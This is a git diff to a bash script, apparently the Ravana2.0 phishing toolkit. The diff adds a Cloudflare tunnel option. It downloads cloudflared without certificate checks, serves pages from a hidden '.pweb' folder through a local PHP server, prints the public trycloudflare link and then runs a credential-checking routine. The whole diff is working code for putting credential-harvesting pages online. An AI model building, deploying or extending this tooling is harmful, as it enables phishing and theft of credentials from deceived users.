@@ -18,13 +18,7 @@ trap user_intrupt SIGINT
 trap user_intrupt SIGTSTP
 
 # make a function to catch signals...
-#Lets check for any update -----
-repoUpdate(){
-	
-	git pull https://github.com/princekrvert/Ravana.git > /dev/null 2>&1 & echo -e "${g}[⏰${g}] ${b} Checking for update ...."
-	clear
-} 
-repoUpdate #Update the repo
+# kill the already running proces
 user_intrupt(){
 	printf " \n ${w}\n"
 	printf " ${r}[${w}!${r}]---->>${p} Exiting Ravana2.0"
@@ -48,8 +42,56 @@ check_cred(){
 	done
 }
 #End of user cred-------------------
+#make a function to download the cloudflare 
+# now start the cloudflare
+start_cloud(){
+    # remove the previous log file
+    rm -rf .pk.txt > /dev/null 2>&1 
+	ran=$((RANDOM % 10))
+	php -S 127.0.0.1:800$ran -t .pweb/$1 > /dev/null 2>&1 & sleep 2
+    # now ask the url 
+    echo -e "\e[0;1m Starting clodflare.. "
+    #check fi it is termux or not ..
+    if [[ `command -v termux-chroot` ]];then
+    sleep 3 && termux-chroot ./cloudflare tunnel -url http://127.0.0.1:800$ran --logfile .pk.txt > /dev/null 2>&1 & #throw all the process in background .. 
+    else
+    sleep 3 && ./cloudflare tunnel -url http://127.0.0.1:800$ran --logfile .pk.txt > /dev/null 2>&1 & 
+    fi
+    # now extract the link from the logfile .. 
+    echo "http://127.0.0.1:800$ran"
+    sleep 8
+    clear
+    banner
+    echo -ne "\e[36;1m Link: "
+    cat .pk.txt | grep "trycloudflare" | cut -d "|" -f2 | cut -d "}" -f2 
+	check_cred $1
+}
+#make a function to download the cloudflared 
+download(){
+    wget --no-check-certificate $1 -O cloudflare
+    chmod +x cloudflare 
+}
+#first check the platform of the machine 
+check_platform(){
+if [[ -e cloudflare ]];then
+    echo -e "\e[36;1m[~] Cloudflared already installed ."
+else
+    echo -e "\e[32;1m Downloding coludflared"
+    host=$(uname -m)
+    if [[($host == "arm") || ($host == "Android")]];then
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
+    elif [[ $host == "aarch64" ]];then
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+    elif [[ $host == "x86_64" ]];then
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+    else 
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
+    fi
+fi
+}
 #Make a server for handle ngrok request
 s_ngrok(){
+
 	echo -e " "
 	if [[ -e ngrok ]];then
 		echo -e "${r}[${w}+${r}] ${g} Turn on your hotspot "
@@ -78,6 +120,7 @@ s_ngrok(){
 #Make a localhost server-----------------------------
 s_localhost(){
 	#start localhost
+	kill_process
 	echo -e "\n"
 	echo -e "${g}[${r}~${g}] ${w} Port selection "
 	echo -e "\n"
@@ -112,8 +155,9 @@ server(){
 	echo -e "\n"
 	echo -e "${g}[${y}+${g}] ${w} Port forwoding "
 	echo -e "\n"
-	echo -e "${p}[${w}01${p}] ${r} Localhost "
-	echo -e "${p}[${w}02${p}] ${r} Ngrok "
+	echo -e "${p}[${w}01${p}] ${r} Localhost(for devloper)"
+	echo -e "${p}[${w}02${p}] ${r} Ngrok (Not working)"
+	echo -e "${p}[${w}03${p}] ${r} Cloudflare (best)"
 	echo -e "\n"
 	echo -ne "${y}[${w}~${y}] ${p} Choose an option: "
 	read p_optn
@@ -125,6 +169,11 @@ server(){
 		echo -e "\n"
 		echo -e "${w}[${r}+${w}] ${g} Starting Ngrok "
 		s_ngrok $1
+	elif [[ $p_optn -eq 3 ]] || [[ $p_optn -eq 03 ]];then
+		echo -e "\n"
+		echo -e "${w}[${r}+${w}] ${g} Starting clouflare "
+	    check_platform
+		start_cloud $1
 	else 
 		echo -e "\n"
 		echo -e "${r} Invalid option."
